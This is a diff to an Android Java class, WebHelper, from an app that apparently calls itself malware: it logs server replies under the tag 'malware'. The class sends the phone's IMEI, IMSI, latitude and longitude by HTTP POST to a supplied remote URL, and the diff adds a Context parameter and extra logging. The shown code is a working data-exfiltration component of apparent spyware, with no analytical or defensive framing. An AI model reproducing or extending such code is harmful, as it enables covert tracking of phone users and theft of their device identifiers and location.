@@ -1,11 +1,17 @@
 package ommrepublic.com.ledieo;
 
+import android.content.Context;
+import android.content.Intent;
+import android.util.Log;
+import android.widget.Toast;
+
 import org.apache.http.HttpResponse;
 import org.apache.http.client.HttpClient;
 import org.apache.http.client.entity.UrlEncodedFormEntity;
 import org.apache.http.client.methods.HttpPost;
 import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.message.BasicNameValuePair;
+import org.apache.http.util.EntityUtils;
 
 import java.util.ArrayList;
 import java.util.List;
@@ -20,13 +26,16 @@ public class WebHelper extends Thread {
     private Double lat=0.0;
     private Double longi=0.0;
 
+    private Context mContext;
 
-    public WebHelper(String u, String imei, String imsi, Double lat, Double longi) {
+
+    public WebHelper(Context context, String u, String imei, String imsi, Double lat, Double longi) {
         this.url=u;
         this.imei=imei;
         this.imsi=imsi;
         this.lat=lat;
         this.longi=longi;
+        mContext = context;
     }
 
     @Override
@@ -54,9 +63,12 @@ public class WebHelper extends Thread {
             // Execute HTTP Post Request
             HttpResponse response = httpclient.execute(httppost);
 
+            Log.d("malware", EntityUtils.toString(response.getEntity()));
+
             return response.toString();
 
         } catch (Exception e) {
+            e.printStackTrace();
             return e.toString();
         }
     }
